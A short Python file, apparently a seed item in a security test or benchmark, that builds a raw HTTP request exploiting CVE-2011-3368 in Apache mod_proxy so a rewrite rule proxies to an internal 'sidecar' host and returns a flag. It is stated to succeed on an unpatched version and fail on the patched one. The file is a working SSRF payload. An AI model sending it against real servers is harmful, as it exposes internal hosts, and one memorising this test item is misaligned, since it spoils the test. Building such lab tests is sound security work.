#!/usr/bin/env python3
"""[GIVEN] CVE-2011-3368 seed exploit — mod_proxy reverse-proxy SSRF.

The canonical CVE-2011-3368 vector: the `RewriteRule .* http://legit-backend%{REQUEST_URI} [P]`
front-end (vhost on port 80). There is NO '/' between the backend authority and the
request-URI, so a request-target that begins with '@sidecar/' is expanded into
  http://legit-backend@sidecar/
i.e. `legit-backend` degrades to userinfo and the internal-only host `sidecar` becomes
the real proxy target -> the flag body is proxied straight back.

Contract: reaches the sidecar (flag) on V0; BLOCKED on V1.
On V1 the CVE-2011-3368 fix adds the request-URI guard to mod_rewrite.c::hook_uri2file
(see patch.diff): a request-URI that does not begin with '/' -> DECLINED, so the
RewriteRule is never applied and the request is not proxied.
"""
from __future__ import annotations

# A well-formed HTTP/1.0 request whose request-target is the uri-authority gap
# `@sidecar/`. No Host header is needed: the proxy target comes from the rewrite.
RAW = b"GET @sidecar/ HTTP/1.0\r\n\r\n"


def candidate() -> dict:
    return {
        "probe_id": "cve-2011-3368-at-authority-rewriterule",
        "method": "GET",
        "http_version": "HTTP/1.0",
        "request_target": "@sidecar/",
        "route": "rewrite",   # -> RewriteRule [P] front-end (vhost :80)
        "raw": RAW.decode("latin-1"),
    }


import json

if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
